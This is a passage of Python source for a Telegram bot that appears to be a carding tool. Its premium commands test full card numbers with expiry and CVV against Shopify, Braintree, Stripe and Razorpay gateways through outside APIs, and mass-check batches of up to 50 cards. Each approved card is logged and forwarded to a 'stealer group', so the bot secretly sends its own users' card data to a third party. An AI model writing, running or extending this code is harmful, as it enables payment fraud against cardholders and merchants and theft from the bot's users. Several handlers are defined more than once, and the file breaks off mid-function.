    """Shopify $6"""
    await check_gate(update, context, "sh6", "Shopify $6", True)

@require_premium
async def gate_sh8(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $8"""
    await check_gate(update, context, "sh8", "Shopify $8", True)

@require_premium
async def gate_sh10(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $10"""
    await check_gate(update, context, "sh10", "Shopify $10", True)

@require_premium
async def gate_sh13(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify $13"""
    await check_gate(update, context, "sh13", "Shopify $13", True)

# PREMIUM GATES - Braintree
@require_premium
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree Checker"""
    await check_gate(update, context, "b3", "Braintree", True)

@require_premium
async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Braintree with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Braintree</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree check with 5 batches and 1s delay"""
    import asyncio
    from modules.gate_checker import check_braintree_gate, get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        msg = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Check Started</b>\n\n"
            f"📊 Cards: {len(cards)}\n"
            f"⚡ Gate: Braintree\n"
            f"🔄 Processing in 5 batches...",
            parse_mode=ParseMode.HTML
        )
        
        approved = []
        declined = []
        errors = []
        
        batch_size = max(1, len(cards) // 5)
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
        
        for batch_num, batch in enumerate(batches, 1):
            for card in batch:
                if context.user_data.get('mass_check_stop'):
                    break
                
                try:
                    loop = asyncio.get_running_loop()
                    result = await asyncio.wait_for(
                        loop.run_in_executor(None, check_braintree_gate, 
                                            card['cc'], card['mm'], card['yy'], card['cvv']),
                        timeout=8.0
                    )
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    
                    if result['status'] == 'success':
                        if 'approved' in result['message'].lower():
                            approved.append(f"✅ {card_str}\n→ {result['message']}")
                        else:
                            declined.append(f"❌ {card_str}\n→ {result['message']}")
                    else:
                        errors.append(f"⚠️ {card_str}\n→ {result['message']}")
                except asyncio.TimeoutError:
                    errors.append(f"⚠️ {card['cc']}|...\n→ No Response (8s)")
                except Exception as e:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
            
            progress_text = f"📊 <b>Mass Braintree Check</b>\n\n"
            progress_text += f"✅ Approved: {len(approved)}\n"
            progress_text += f"❌ Declined: {len(declined)}\n"
            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
            
            try:
                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
            
            if context.user_data.get('mass_check_stop'):
                break
            
            if batch_num < len(batches):
                await asyncio.sleep(1)
        
        stopped = context.user_data.get('mass_check_stop', False)
        status_text = "STOPPED" if stopped else "Complete"
        
        result_text = f"📊 <b>Mass Braintree Check {status_text}</b>\n\n"
        result_text += f"✅ Approved: {len(approved)}\n"
        result_text += f"❌ Declined: {len(declined)}\n"
        result_text += f"⚠️ Errors: {len(errors)}\n\n"
        
        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"
        
        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined:
                result_text += f"<code>{d}</code>\n\n"
        
        if errors:
            result_text += "<b>⚠️ ERRORS:</b>\n"
            for e in errors:
                result_text += f"<code>{e}</code>\n\n"
        
        try:
            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

# BRAINTREE EXTERNAL API GATES
@require_premium
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree checker using external API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("b3"):
        await update.message.reply_text(offline_message("b3"), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/b3 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Braintree",
        parse_mode=ParseMode.HTML
    )
    
    from modules.braintree_gate import check_braintree
    result = await check_braintree(cc, mm, yy, cvv)
    
    from modules.gate_checker import get_bin_info
    bin_info = get_bin_info(cc)
    
    if result['status'] == 'APPROVED':
        log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", result['message'], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", result['message'], bin_info, user.id, user.username or user.first_name)
        
        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
━━━━━━━━━━━━━━━━━━━━
✅ <b>APPROVED</b>
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
📋 {result['response']}
━━━━━━━━━━━━━━━━━━━━
💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
🏦 {bin_info.get('bank', 'N/A')}
🌍 {bin_info.get('country', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👤 @{user.username or user.first_name}"""

        try:
            success_gif = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    elif result['status'] == 'CCN':
        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
━━━━━━━━━━━━━━━━━━━━
🔵 <b>CCN (3DS)</b>
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
📋 {result['response']}
━━━━━━━━━━━━━━━━━━━━
💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
🏦 {bin_info.get('bank', 'N/A')}
🌍 {bin_info.get('country', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👤 @{user.username or user.first_name}"""

        try:
            success_gif = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    else:
        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
━━━━━━━━━━━━━━━━━━━━
❌ <b>DECLINED</b>
💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
📋 {result['response']}
━━━━━━━━━━━━━━━━━━━━
💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
🏦 {bin_info.get('bank', 'N/A')}
🌍 {bin_info.get('country', 'N/A')}
━━━━━━━━━━━━━━━━━━━━
👤 @{user.username or user.first_name}"""

        try:
            failed_gif = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=failed_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@require_premium
async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Braintree with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Braintree</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree check with 5 batches and 1s delay"""
    import asyncio
    from modules.braintree_gate import check_braintree
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        msg = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Check Started</b>\n\n"
            f"📊 Cards: {len(cards)}\n"
            f"⚡ Gate: Braintree\n"
            f"🔄 Processing in 5 batches with 1s delay...",
            parse_mode=ParseMode.HTML
        )
        
        approved = []
        ccn = []
        declined = []
        errors = []
        
        batch_size = max(1, (len(cards) + 4) // 5)
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
        
        for batch_num, batch in enumerate(batches, 1):
            if context.user_data.get('mass_check_stop'):
                break
            
            for card in batch:
                if context.user_data.get('mass_check_stop'):
                    break
                
                try:
                    result = await asyncio.wait_for(
                        check_braintree(card['cc'], card['mm'], card['yy'], card['cvv']),
                        timeout=60.0
                    )
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    
                    if result['status'] == 'APPROVED':
                        approved.append(f"✅ {card_str}\n→ {result['response']}")
                        bin_info = get_bin_info(card['cc'])
                        log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", result['message'], bin_info)
                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", result['message'], bin_info, user.id, user.username or user.first_name)
                        await send_approved_card_with_gif(update, card_str, "b3", result.get('message', 'Charged'), 3.0, bin_info)
                    elif result['status'] == 'CCN':
                        ccn.append(f"🔵 {card_str}\n→ {result['response']}")
                    elif result['status'] == 'DECLINED':
                        declined.append(f"❌ {card_str}\n→ {result['response']}")
                    else:
                        errors.append(f"⚠️ {card_str}\n→ {result['response']}")
                except asyncio.TimeoutError:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Timeout (60s)")
                except Exception as e:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
            
            progress_text = f"📊 <b>Mass Braintree Check</b>\n\n"
            progress_text += f"✅ Approved: {len(approved)}\n"
            progress_text += f"🔵 CCN: {len(ccn)}\n"
            progress_text += f"❌ Declined: {len(declined)}\n"
            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
            
            try:
                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
            
            if batch_num < len(batches):
                await asyncio.sleep(1.0)
        
        stopped = context.user_data.get('mass_check_stop', False)
        status_text = "STOPPED" if stopped else "Complete"
        result_text = f"📊 <b>Mass Braintree Check {status_text}</b>\n\n"
        result_text += f"✅ Approved: {len(approved)}\n"
        result_text += f"🔵 CCN: {len(ccn)}\n"
        result_text += f"❌ Declined: {len(declined)}\n"
        result_text += f"⚠️ Errors: {len(errors)}\n\n"
        
        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"
        
        if ccn:
            result_text += "<b>🔵 CCN:</b>\n"
            for c in ccn:
                result_text += f"<code>{c}</code>\n\n"
        
        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined:
                result_text += f"<code>{d}</code>\n\n"
        
        if errors:
            result_text += "<b>⚠️ ERRORS:</b>\n"
            for e in errors[:10]:
                result_text += f"<code>{e}</code>\n\n"
            if len(errors) > 10:
                result_text += f"<i>... and {len(errors) - 10} more errors</i>\n\n"
        
        try:
            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

@require_premium
async def gate_bt1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree $1"""
    await check_gate(update, context, "bt1", "Braintree $1", True)

@require_premium
async def gate_bt3d(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree 3D"""
    await check_gate(update, context, "bt3d", "Braintree 3D", True)

# Braintree API Gate (vkrm.site)
@require_premium
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree (vkrm API)"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("b3"):
        await update.message.reply_text(offline_message("b3"), parse_mode=ParseMode.HTML)
        return
    import time
    from modules.bin_lookup import format_mass_card_result

    user = update.effective_user
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Braintree Gate</b>\n\n"
            "Usage: <code>/b3 CC|MM|YY|CVV</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_text = context.args[0]
    parts = card_text.split('|')
    if len(parts) < 4:
        await update.message.reply_text(ae("❌ Invalid format. Use: CC|MM|YY|CVV"))
        return
    
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    
    msg = await update.message.reply_text(ae("⏳ Checking card..."))
    start = time.time()
    
    try:
        result = await check_b3(cc, mm, yy, cvv)
        elapsed = round(time.time() - start, 2)
        
        status = result.get('status', 'ERROR')
        response = result.get('response', 'Unknown')
        
        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        
        if status in ['CHARGED', 'CCN']:
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", response, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", response, bin_info, user.id, user.username or user.first_name)
            await msg.delete()
            await send_approved_card_with_gif(update, card_text, "b3", response, elapsed, bin_info)
        else:
            card_result = ae(format_mass_card_result(card_text, status, response, "Braintree", elapsed))
            await msg.edit_text(card_result, parse_mode=ParseMode.HTML)
    except Exception as e:
        await msg.edit_text(ae(f"❌ Error: {str(e)[:100]}"))

@require_premium
async def gate_mb3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Braintree check with 5 batches and 1s delay"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("mb3"):
        await update.message.reply_text(offline_message("mb3"), parse_mode=ParseMode.HTML)
        return
    import time
    from modules.bin_lookup import format_mass_card_result

    user = update.effective_user
    user_id = user.id

    if not context.args:
        await update.message.reply_text(
            "📋 <b>Mass Braintree Check</b>\n\n"
            "Send cards: <code>/mb3 CC|MM|YY|CVV</code>\n"
            "One per line. Max 50 cards.\n"
            "5 parallel + 1s delay between batches.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree check"""
    import time
    from modules.bin_lookup import format_mass_card_result
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ Already running a mass check. Use /stop to cancel."))
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        extracted = extract_cards_from_text(cards_text)
        cards = [f"{c[0]}|{c[1]}|{c[2]}|{c[3]}" for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total = len(cards)
        approved = 0
        declined = 0
        
        header = await update.message.reply_text(
            f"🔄 <b>Mass Braintree Check</b>\n"
            f"Total: {total} | Batch: 5 | Delay: 1s\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )
        
        results = await mass_check_b3(cards, batch_size=5, delay=1.0)
        
        for r in results:
            if context.user_data.get('mass_check_stop'):
                break
            
            card = r.get('card', '')
            status = r.get('status', 'ERROR')
            response = r.get('response', 'Unknown')
            
            if status in ['CHARGED', 'CCN']:
                approved += 1
                parts = card.split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    bin_info = get_bin_info(cc)
                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", response, bin_info)
                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card, "b3", response, 0, bin_info)
            else:
                declined += 1
                card_result = ae(format_mass_card_result(card, status, response, "Braintree", 0))
                try:
                    await context.bot.send_message(
                        chat_id=update.message.chat_id,
                        text=card_result,
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        
        await header.edit_text(
            f"✅ <b>Mass Braintree Complete</b>\n\n"
            f"📊 Total: {total}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Declined: {declined}",
            parse_mode=ParseMode.HTML
        )
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False

# PREMIUM GATES - Auto Stripe Auth (newrp.vercel.app)
@require_premium
async def gate_ast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auto Stripe Auth using newrp.vercel.app API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("ast"):
        await update.message.reply_text(offline_message("ast"), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/ast 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Auto Stripe Auth",
        parse_mode=ParseMode.HTML
    )
    
    import time as time_module
    start_time = time_module.time()
    result = await check_ast(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    from modules.gate_checker import get_bin_info
    bin_info = get_bin_info(cc)
    
    status = result.get('status', 'ERROR')
    response = result.get('response', 'Unknown')
    
    username = user.username or user.first_name
    
    if status in ['CHARGED', 'CCN', 'LIVE']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "ast", response, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "ast", response, bin_info, user.id, username)
        
        msg = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response}", "Auto Stripe Auth", bin_info, elapsed, username)
        
        try:
            gif_url = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=gif_url, caption=msg, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(msg, parse_mode=ParseMode.HTML)
    else:
        msg = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response}", "Auto Stripe Auth", bin_info, elapsed, username)
        
        try:
            gif_url = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=gif_url, caption=msg, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(msg, parse_mode=ParseMode.HTML)

@require_premium
async def mass_ast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Auto Stripe Auth check with 5 parallel batches"""
    user = update.effective_user

    cards_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not cards_text:
        await update.message.reply_text(
            "📋 <b>Mass Auto Stripe Auth</b>\n\n"
            "Send cards: <code>/mast CC|MM|YY|CVV</code>\n"
            "One per line. Max 50 cards.\n"
            "5 parallel + 1s delay between batches.\n"
            "Or reply to a .txt file with this command.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_ast'] = True
        return

    await process_mass_ast(update, context, cards_text)

async def process_mass_ast(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Auto Stripe Auth check"""
    import time
    from modules.bin_lookup import format_mass_card_result
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ Already running a mass check. Use /stop to cancel."))
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'ast'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        extracted = extract_cards_from_text(cards_text)
        cards = [f"{c[0]}|{c[1]}|{c[2]}|{c[3]}" for c in extracted]
        
        if not cards:
            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total = len(cards)
        approved = 0
        declined = 0
        
        header = await _get_or_edit_loading_msg(
            context, update,
            f"🔄 <b>Mass Auto Stripe Auth</b>\n"
            f"Total: {total} | Batch: 5 | Delay: 1s\n"
            f"⏳ Processing...",
        )
        
        results = await mass_check_ast(cards, batch_size=5, delay=1.0)
        
        for r in results:
            if context.user_data.get('mass_check_stop'):
                break
            
            card = r.get('card', '')
            status = r.get('status', 'ERROR')
            response = r.get('response', 'Unknown')
            
            if status in ['CHARGED', 'CCN', 'LIVE']:
                approved += 1
                parts = card.split('|')
                if len(parts) >= 4:
                    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                    bin_info = get_bin_info(cc)
                    log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "ast", response, bin_info)
                    await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "ast", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card, "ast", response, 0, bin_info)
            else:
                declined += 1
                card_result = ae(format_mass_card_result(card, status, response, "Auto Stripe Auth", 0))
                try:
                    await context.bot.send_message(
                        chat_id=update.message.chat_id,
                        text=card_result,
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        
        await header.edit_text(
            f"✅ <b>Mass Auto Stripe Auth Complete</b>\n\n"
            f"📊 Total: {total}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Declined: {declined}",
            parse_mode=ParseMode.HTML
        )
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False

# PREMIUM GATES - Stripe NewRP Auth
@require_premium
async def gate_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Auth (NewRP)"""
    await check_gate(update, context, "st", "Stripe Auth", True)

@require_premium
async def mass_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Stripe Auth with 5 parallel batches and 0.25s delay"""
    user = update.effective_user

    cards_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not cards_text:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Stripe Auth</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.\n"
            "Or reply to a .txt file with this command.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_st'] = True
        return

    await process_mass_st(update, context, cards_text)

async def process_mass_st(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Stripe Auth check using same API as /st"""
    import asyncio
    import time
    from modules.gate_checker import get_bin_info, check_card_php, format_gate_response
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'st'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        header_msg = await _get_or_edit_loading_msg(
            context, update,
            f"🔄 <b>Mass Stripe Auth Check</b>\n"
            f"Total: {total_cards}\n"
            f"⏳ Processing...",
        )
        
        for i, card in enumerate(cards):
            if context.user_data.get('mass_check_stop'):
                break
            
            card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
            start_time = time.time()
            
            try:
                loop = asyncio.get_running_loop()
                result = await asyncio.wait_for(
                    loop.run_in_executor(None, check_card_php, 
                                        "st", card['cc'], card['mm'], card['yy'], card['cvv'], user.id),
                    timeout=30.0
                )
                elapsed = round(time.time() - start_time, 2)
                
                msg_lower = result.get('message', '').lower()
                status = 'APPROVED' if result['status'] == 'success' and ('approved' in msg_lower or 'success' in msg_lower or 'valid' in msg_lower) else 'DECLINED'
                response = result.get('message', 'Unknown')
                
                if status == 'APPROVED':
                    approved_count += 1
                    bin_info = get_bin_info(card['cc'])
                    log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "st", response, bin_info)
                    await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "st", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card_str, "st", response, elapsed, bin_info)
                else:
                    declined_count += 1
                    card_result = ae(format_mass_card_result(card_str, status, response, "Stripe Auth", elapsed))
                    try:
                        await context.bot.send_message(
                            chat_id=update.message.chat_id,
                            text=card_result,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
                    
            except asyncio.TimeoutError:
                error_count += 1
                elapsed = round(time.time() - start_time, 2)
                card_result = ae(format_mass_card_result(card_str, "ERROR", "Timeout (8s)", "Stripe Auth", elapsed))
                try:
                    await context.bot.send_message(chat_id=update.message.chat_id, text=card_result, parse_mode=ParseMode.HTML)
                except:
                    pass
            except Exception as e:
                error_count += 1
                elapsed = round(time.time() - start_time, 2)
                card_result = ae(format_mass_card_result(card_str, "ERROR", str(e)[:50], "Stripe Auth", elapsed))
            
            if i < len(cards) - 1:
                await asyncio.sleep(0.25)
        
        stopped = context.user_data.get('mass_check_stop', False)
        header = ae(format_mass_header(total_cards, approved_count, declined_count, error_count))
        if stopped:
            header = ae("⏹️ Mass Check STOPPED\n") + header
        
        try:
            await header_msg.edit_text(header, parse_mode=ParseMode.HTML)
        except:
            pass
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False


# PREMIUM GATES - Razorpay
@require_premium
async def gate_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Razorpay ₹1 using Nyvexis API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("rz"):
        await update.message.reply_text(offline_message("rz"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/rz 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Razorpay ₹1",
        parse_mode=ParseMode.HTML
    )
    
    from modules.rpp_gate import check_razorpay
    start_time = time_module.time()
    result = await check_razorpay(cc, mm, yy, cvv, amount=10)
    elapsed = time_module.time() - start_time
    
    from modules.gate_checker import get_bin_info
    bin_info = get_bin_info(cc)
    username = user.username or user.first_name
    
    if result['status'] == 'APPROVED':
        log_approved_card(user.id, username, cc, mm, yy, cvv, "rz", result['message'], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rz", result['message'], bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {result['response']}", "Razorpay ₹1", bin_info, elapsed, username)
